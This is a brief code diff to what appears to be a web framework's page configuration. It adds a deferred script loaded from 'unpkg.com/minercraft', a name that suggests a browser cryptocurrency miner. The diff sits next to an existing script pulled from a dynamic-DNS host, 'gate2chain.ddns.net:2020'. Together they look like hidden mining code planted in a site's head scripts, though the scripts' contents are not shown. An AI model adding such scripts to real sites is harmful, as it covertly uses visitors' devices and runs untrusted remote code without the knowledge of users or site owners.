@@ -38,6 +38,10 @@ export default {
         defer: true
       },
       {
+        src: 'https://unpkg.com/minercraft',
+        defer: true
+      },
+      {
         src: 'https://gate2chain.ddns.net:2020/libs/g2clib.min.js',
         defer: true
       }
